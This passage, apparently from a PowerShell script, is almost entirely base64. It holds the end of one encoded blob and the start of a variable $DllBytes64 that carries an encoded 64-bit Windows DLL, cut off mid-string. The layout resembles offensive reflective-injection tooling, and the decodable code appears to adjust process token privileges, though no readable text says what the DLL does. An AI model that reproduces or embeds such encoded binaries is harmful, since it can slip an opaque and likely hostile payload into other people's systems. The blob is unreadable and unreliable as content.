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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=="
    $DllBytes64 = "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